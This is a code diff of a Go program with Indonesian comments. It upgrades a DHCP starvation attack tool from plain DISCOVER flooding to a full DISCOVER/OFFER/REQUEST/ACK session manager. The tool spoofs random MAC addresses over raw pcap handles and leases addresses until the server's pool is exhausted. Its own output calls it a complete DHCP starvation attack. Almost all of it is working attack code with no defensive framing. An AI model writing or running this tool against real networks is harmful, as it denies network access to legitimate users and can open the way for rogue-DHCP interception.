@@ -18,13 +18,30 @@ import (
 	"github.com/google/gopacket/pcap"
 )
 
-// Struktur untuk melacak permintaan yang kita kirim
-type activeRequest struct {
-	mac    net.HardwareAddr
-	sentAt time.Time
+// --- Konstanta untuk State Machine ---
+const (
+	STATE_WAITING_OFFER = iota
+	STATE_WAITING_ACK
+	STATE_COMPLETED
+)
+
+// --- Konfigurasi ---
+const (
+	MAX_CONCURRENT_SESSIONS = 50               // Maksimal sesi DHCP aktif
+	SESSION_TIMEOUT         = 10 * time.Second // Timeout untuk menunggu respons
+)
+
+// dhcpSession menyimpan semua informasi untuk satu proses negosiasi DHCP
+type dhcpSession struct {
+	mac          net.HardwareAddr
+	xid          uint32
+	state        int
+	offeredIP    net.IP
+	serverIP     net.IP
+	lastActivity time.Time
 }
 
-// generateRandomMAC menghasilkan sebuah MAC address acak yang valid.
+// Fungsi helper untuk membuat MAC acak
 func generateRandomMAC() (net.HardwareAddr, error) {
 	buf := make([]byte, 6)
 	_, err := rand.Read(buf)
@@ -35,91 +52,121 @@ func generateRandomMAC() (net.HardwareAddr, error) {
 	return net.HardwareAddr(buf), nil
 }
 
-// getMACByIP mencari MAC address dari interface berdasarkan alamat IPnya.
+// Fungsi helper untuk mencari interface
 func getMACByIP(targetIP net.IP) (net.HardwareAddr, error) {
 	interfaces, err := net.Interfaces()
 	if err != nil {
 		return nil, err
 	}
-
 	for _, iface := range interfaces {
 		addrs, err := iface.Addrs()
 		if err != nil {
 			continue
 		}
-		for _, addr := range addrs {
-			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
+		for _, a := range addrs {
+			if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
 				if ipnet.IP.Equal(targetIP) {
 					return iface.HardwareAddr, nil
 				}
 			}
 		}
 	}
-
 	return nil, fmt.Errorf("tidak bisa menemukan MAC untuk IP %s", targetIP)
 }
 
-// listener adalah goroutine yang mendengarkan respons DHCPOFFER dari server.
-// VERSI DEBUG
-func listener(handle *pcap.Handle, activeReqs *sync.Map) {
-	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
-	packetCount := 0
-	for packet := range packetSource.Packets() {
-		packetCount++
-		// DEBUG: Cetak setiap 100 paket yang ditangkap agar tidak spam
-		if packetCount%100 == 0 {
-			fmt.Printf("[DEBUG] Listener telah menangkap %d paket...\n", packetCount)
-		}
+// --- Pembuat Paket ---
 
-		dhcpLayer := packet.Layer(layers.LayerTypeDHCPv4)
-		if dhcpLayer == nil {
-			continue // Bukan paket DHCP, lanjut ke paket berikutnya
-		}
-
-		dhcp, _ := dhcpLayer.(*layers.DHCPv4)
-		fmt.Printf("[DEBUG] Menangkap paket DHCP! Op: %d, Xid: %d\n", dhcp.Operation, dhcp.Xid)
-
-		// Kita hanya tertarik pada DHCPOFFER
-		if dhcp.Operation == layers.DHCPOpReply && len(dhcp.Options) > 0 {
-			msgTypeFound := false
-			for _, opt := range dhcp.Options {
-				if opt.Type == layers.DHCPOptMessageType && len(opt.Data) > 0 {
-					if opt.Data[0] == byte(layers.DHCPMsgTypeOffer) {
-						msgTypeFound = true
-						break
-					}
-				}
-			}
-
-			if msgTypeFound {
-				fmt.Printf("[DEBUG] Menemukan DHCPOFFER untuk Xid: %d\n", dhcp.Xid)
-				if reqInterface, ok := activeReqs.Load(dhcp.Xid); ok {
-					req := reqInterface.(activeRequest)
-					fmt.Printf("\n>>> SUKSES! IP %s ditawarkan untuk MAC %s (Xid: %d) <<<\n", dhcp.YourClientIP, req.mac, dhcp.Xid)
-					activeReqs.Delete(dhcp.Xid)
-				} else {
-					fmt.Printf("[DEBUG] DHCPOFFER dengan Xid %d tidak cocok dengan permintaan aktif.\n", dhcp.Xid)
-				}
-			}
-		}
+// createDiscoverPacket membuat paket DHCPDISCOVER
+func createDiscoverPacket(clientMAC net.HardwareAddr, xid uint32) ([]byte, error) {
+	ethLayer := &layers.Ethernet{
+		SrcMAC:       clientMAC,
+		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
+		EthernetType: layers.EthernetTypeIPv4,
 	}
+	ipLayer := &layers.IPv4{
+		SrcIP:    net.IPv4(0, 0, 0, 0),
+		DstIP:    net.IPv4(255, 255, 255, 255),
+		Protocol: layers.IPProtocolUDP,
+	}
+	udpLayer := &layers.UDP{SrcPort: 68, DstPort: 67}
+	udpLayer.SetNetworkLayerForChecksum(ipLayer)
+
+	dhcpOptions := []layers.DHCPOption{
+		{Type: layers.DHCPOptMessageType, Data: []byte{byte(layers.DHCPMsgTypeDiscover)}},
+		{Type: 55, Data: []byte{1, 3, 6, 15, 119}}, // Parameter Request List
+		{Type: layers.DHCPOptEnd},
+	}
+	dhcpLayer := &layers.DHCPv4{
+		Operation:    layers.DHCPOpRequest,
+		HardwareType: layers.LinkTypeEthernet,
+		ClientHWAddr: clientMAC,
+		Xid:          xid,
+		Flags:        0x8000,
+		Options:      dhcpOptions,
+	}
+
+	buf := gopacket.NewSerializeBuffer()
+	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
+	if err := gopacket.SerializeLayers(buf, opts, ethLayer, ipLayer, udpLayer, dhcpLayer); err != nil {
+		return nil, err
+	}
+	return buf.Bytes(), nil
 }
 
+// createRequestPacket membuat paket DHCPREQUEST
+func createRequestPacket(clientMAC net.HardwareAddr, xid uint32, offeredIP, serverIP net.IP) ([]byte, error) {
+	ethLayer := &layers.Ethernet{
+		SrcMAC:       clientMAC,
+		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
+		EthernetType: layers.EthernetTypeIPv4,
+	}
+	ipLayer := &layers.IPv4{
+		SrcIP:    net.IPv4(0, 0, 0, 0),
+		DstIP:    net.IPv4(255, 255, 255, 255),
+		Protocol: layers.IPProtocolUDP,
+	}
+	udpLayer := &layers.UDP{SrcPort: 68, DstPort: 67}
+	udpLayer.SetNetworkLayerForChecksum(ipLayer)
+
+	// Opsi untuk REQUEST berbeda dengan DISCOVER
+	dhcpOptions := []layers.DHCPOption{
+		{Type: layers.DHCPOptMessageType, Data: []byte{byte(layers.DHCPMsgTypeRequest)}},
+		{Type: layers.DHCPOptRequestIP, Data: offeredIP.To4()}, // Meminta IP yang ditawarkan
+		{Type: layers.DHCPOptServerID, Data: serverIP.To4()},   // Menyebut server mana yang dipilih
+		{Type: layers.DHCPOptEnd},
+	}
+	dhcpLayer := &layers.DHCPv4{
+		Operation:    layers.DHCPOpRequest,
+		HardwareType: layers.LinkTypeEthernet,
+		ClientHWAddr: clientMAC,
+		Xid:          xid,
+		Flags:        0x8000,
+		ClientIP:     offeredIP, // Field ini diisi dengan IP yang diminta
+		Options:      dhcpOptions,
+	}
+
+	buf := gopacket.NewSerializeBuffer()
+	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
+	if err := gopacket.SerializeLayers(buf, opts, ethLayer, ipLayer, udpLayer, dhcpLayer); err != nil {
+		return nil, err
+	}
+	return buf.Bytes(), nil
+}
+
+// --- Fungsi Utama ---
+
 func main() {
-	// --- LANGKAH 1: PILIH INTERFACE ---
+	// --- 1. Pemilihan Interface (sama seperti sebelumnya) ---
 	devices, err := pcap.FindAllDevs()
 	if err != nil {
 		log.Fatalf("Gagal mencari device: %v", err)
 	}
-
 	if len(devices) == 0 {
 		log.Fatal("Tidak ada interface jaringan yang ditemukan.")
 	}
-
 	fmt.Println("Pilih Interface Jaringan:")
 	for i, device := range devices {
 		fmt.Printf("[%d] %s\n", i+1, device.Description)
-		fmt.Printf("    Nama: %s\n", device.Name)
 		if len(device.Addresses) > 0 {
 			for _, addr := range device.Addresses {
 				if addr.IP.To4() != nil {
@@ -129,41 +176,33 @@ func main() {
 		}
 		fmt.Println("----------------------------------")
 	}
-
 	reader := bufio.NewReader(os.Stdin)
 	fmt.Print("Masukkan nomor interface yang dipilih: ")
 	input, _ := reader.ReadString('\n')
 	input = strings.TrimSpace(input)
-
 	choice, err := strconv.Atoi(input)
 	if err != nil || choice < 1 || choice > len(devices) {
 		log.Fatalf("Pilihan tidak valid. Masukkan angka dari 1 hingga %d.", len(devices))
 	}
-
 	selectedDevice := devices[choice-1]
 	var selectedIP net.IP
-	if len(selectedDevice.Addresses) > 0 {
-		for _, addr := range selectedDevice.Addresses {
-			if addr.IP.To4() != nil {
-				selectedIP = addr.IP
-				break
-			}
+	for _, addr := range selectedDevice.Addresses {
+		if addr.IP.To4() != nil {
+			selectedIP = addr.IP
+			break
 		}
 	}
-
 	if selectedIP == nil {
 		log.Fatalf("Interface yang dipilih tidak memiliki alamat IPv4.")
 	}
-
 	srcMAC, err := getMACByIP(selectedIP)
 	if err != nil {
 		log.Fatalf("Gagal mendapatkan MAC address: %v", err)
 	}
-
 	fmt.Printf("\nInterface dipilih: %s (%s)\n", selectedDevice.Description, selectedDevice.Name)
 	fmt.Printf("MAC Address Asli: %s\n\n", srcMAC)
 
-	// --- LANGKAH 2: SIAPKAN HANDLE DAN GOROUTINE ---
+	// --- 2. Inisialisasi Handle dan Peta Sesi ---
 	listenerHandle, err := pcap.OpenLive(selectedDevice.Name, 65536, true, pcap.BlockForever)
 	if err != nil {
 		log.Fatalf("Gagal membuka handle listener: %v", err)
@@ -172,101 +211,117 @@ func main() {
 	if err := listenerHandle.SetBPFFilter("port 67 or port 68"); err != nil {
 		log.Fatalf("Gagal set filter BPF: %v", err)
 	}
-
 	senderHandle, err := pcap.OpenLive(selectedDevice.Name, 65536, false, pcap.BlockForever)
 	if err != nil {
 		log.Fatalf("Gagal membuka handle sender: %v", err)
 	}
 	defer senderHandle.Close()
 
-	var activeRequests sync.Map
-	go listener(listenerHandle, &activeRequests)
+	// sync.Map untuk menyimpan sesi yang aman untuk goroutine
+	var sessions sync.Map
 
-	fmt.Println("Memulai pengiriman DHCP Discover dan pendengaran DHCPOFFER...")
+	// --- 3. Goroutine Pendengar (Lebih Pintar) ---
+	go func() {
+		packetSource := gopacket.NewPacketSource(listenerHandle, listenerHandle.LinkType())
+		for packet := range packetSource.Packets() {
+			dhcpLayer := packet.Layer(layers.LayerTypeDHCPv4)
+			if dhcpLayer == nil {
+				continue
+			}
+			dhcp, _ := dhcpLayer.(*layers.DHCPv4)
+
+			// Cari session berdasarkan Xid
+			sessionInterface, ok := sessions.Load(dhcp.Xid)
+			if !ok {
+				continue
+			}
+			session := sessionInterface.(*dhcpSession)
+
+			// Proses DHCPOFFER
+			if dhcp.Operation == layers.DHCPOpReply {
+				for _, opt := range dhcp.Options {
+					if opt.Type == layers.DHCPOptMessageType && len(opt.Data) > 0 && opt.Data[0] == byte(layers.DHCPMsgTypeOffer) {
+						session.state = STATE_WAITING_ACK
+						session.offeredIP = dhcp.YourClientIP
+						// Cari Server Identifier dari opsi
+						for _, opt2 := range dhcp.Options {
+							if opt2.Type == layers.DHCPOptServerID {
+								session.serverIP = net.IP(opt2.Data)
+								break
+							}
+						}
+						session.lastActivity = time.Now()
+						fmt.Printf(">>> OFFER diterima untuk MAC %s, IP %s (Server: %s) <<<\n", session.mac, session.offeredIP, session.serverIP)
+						break
+					}
+				}
+			}
+
+			// Proses DHCPACK
+			for _, opt := range dhcp.Options {
+				if opt.Type == layers.DHCPOptMessageType && len(opt.Data) > 0 && opt.Data[0] == byte(layers.DHCPMsgTypeAck) {
+					if session.state == STATE_WAITING_ACK {
+						session.state = STATE_COMPLETED
+						fmt.Printf(">>> SUKSES! IP %s DIKUNCI untuk MAC %s (Xid: %d) <<<\n", session.offeredIP, session.mac, session.xid)
+					}
+					break
+				}
+			}
+		}
+	}()
+
+	// --- 4. Loop Utama Manajer Sesi ---
+	fmt.Println("Memulai serangan DHCP Starvation yang lengkap...")
 	fmt.Println("Tekan Ctrl+C untuk berhenti.")
+	ticker := time.NewTicker(1 * time.Second)
+	defer ticker.Stop()
 
-	// --- LANGKAH 3: LOOP PENGIRIMAN ---
-	requestCount := 0
-	for {
-		requestCount++
-		clientMAC, err := generateRandomMAC()
-		if err != nil {
-			log.Printf("Gagal membuat MAC: %v", err)
-			continue
+	for range ticker.C {
+		activeCount := 0
+		now := time.Now()
+
+		// Scan untuk membersihkan sesi timeout dan menghitung sesi aktif
+		sessions.Range(func(key, value interface{}) bool {
+			s := value.(*dhcpSession)
+			if now.Sub(s.lastActivity) > SESSION_TIMEOUT {
+				fmt.Printf("[-] Sesi untuk MAC %s (Xid: %d) timeout. Dihapus.\n", s.mac, s.xid)
+				sessions.Delete(key)
+			} else if s.state != STATE_COMPLETED {
+				activeCount++
+			}
+			return true
+		})
+
+		// Jika masih ada slot, buat sesi baru
+		if activeCount < MAX_CONCURRENT_SESSIONS {
+			clientMAC, _ := generateRandomMAC()
+			xidBytes := make([]byte, 4)
+			rand.Read(xidBytes)
+			xid := binary.BigEndian.Uint32(xidBytes)
+
+			newSession := &dhcpSession{
+				mac:          clientMAC,
+				xid:          xid,
+				state:        STATE_WAITING_OFFER,
+				lastActivity: now,
+			}
+			sessions.Store(xid, newSession)
+
+			packet, _ := createDiscoverPacket(clientMAC, xid)
+			senderHandle.WritePacketData(packet)
+			fmt.Printf("[+] Memulai sesi untuk MAC %s (Xid: %d)\n", clientMAC, xid)
 		}
 
-		xidBytes := make([]byte, 4)
-		rand.Read(xidBytes)
-		xid := binary.BigEndian.Uint32(xidBytes)
-
-		activeRequests.Store(xid, activeRequest{mac: clientMAC, sentAt: time.Now()})
-		fmt.Printf("[%d] Mengirim DHCP Discover dari MAC: %s (Xid: %d)\n", requestCount, clientMAC, xid)
-
-		// --- Bagian yang DIUBAH (SOLUSI 2: RAW BYTES - PALING AMPUH) ---
-		ethLayer := &layers.Ethernet{
-			SrcMAC:       clientMAC,
-			DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
-			EthernetType: layers.EthernetTypeIPv4,
-		}
-		ipLayer := &layers.IPv4{
-			SrcIP:    net.IPv4(0, 0, 0, 0),
-			DstIP:    net.IPv4(255, 255, 255, 255),
-			Protocol: layers.IPProtocolUDP,
-		}
-		udpLayer := &layers.UDP{
-			SrcPort: 68,
-			DstPort: 67,
-		}
-		udpLayer.SetNetworkLayerForChecksum(ipLayer)
-
-		// --- Buat payload DHCP secara manual sebagai byte slice ---
-		// Ini adalah struktur paket DHCP yang sebenarnya
-		payload := make([]byte, 240+9) // 240 byte header + 9 byte untuk opsi-opsi kita
-
-		// Header DHCP (offset 0-239)
-		payload[0] = 1 // Op: Request
-		payload[1] = 1 // Htype: Ethernet
-		payload[2] = 6 // Hlen: 6 bytes for MAC
-		payload[3] = 0 // Hops
-
-		// Xid (Transaction ID) pada offset 4-7
-		binary.BigEndian.PutUint32(payload[4:8], xid)
-
-		// Secs (8-9) & Flags (10-11)
-		binary.BigEndian.PutUint16(payload[8:10], 0)       // Secs
-		binary.BigEndian.PutUint16(payload[10:12], 0x8000) // Flags: Broadcast
-
-		// IP addresses (12-27) semua diisi 0
-		// Client IP, Your Client IP, Next Server IP, Relay Agent IP
-
-		// Client MAC Address (28-43), hanya 6 byte pertama yang dipakai
-		copy(payload[28:34], clientMAC)
-		// sisanya (sname, file) sudah otomatis 0
-
-		// Magic Cookie pada offset 236-239
-		binary.BigEndian.PutUint32(payload[236:240], 0x63825363)
-
-		// Opsi-opsi DHCP (dimulai dari offset 240)
-		payload[240] = 53  // Message Type option
-		payload[241] = 1   // Length
-		payload[242] = 1   // DHCP Discover
-		payload[243] = 55  // Parameter Request List
-		payload[244] = 3   // Length
-		payload[245] = 1   // Subnet Mask
-		payload[246] = 3   // Router
-		payload[247] = 6   // DNS Server
-		payload[248] = 255 // End Option
-
-		// --- Kirim Paket ---
-		// Kita gunakan gopacket.Payload untuk membungkus byte array kita
-		buf := gopacket.NewSerializeBuffer()
-		opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
-		gopacket.SerializeLayers(buf, opts, ethLayer, ipLayer, udpLayer, gopacket.Payload(payload))
-
-		if err := senderHandle.WritePacketData(buf.Bytes()); err != nil {
-			log.Printf("Gagal mengirim paket: %v", err)
-		}
-
-		time.Sleep(100 * time.Millisecond)
+		// Proses sesi yang menunggu ACK
+		sessions.Range(func(key, value interface{}) bool {
+			s := value.(*dhcpSession)
+			if s.state == STATE_WAITING_ACK {
+				packet, _ := createRequestPacket(s.mac, s.xid, s.offeredIP, s.serverIP)
+				senderHandle.WritePacketData(packet)
+				fmt.Printf("[*] Mengirim REQUEST untuk MAC %s, IP %s\n", s.mac, s.offeredIP)
+				s.lastActivity = now // Update activity time
+			}
+			return true
+		})
 	}
 }
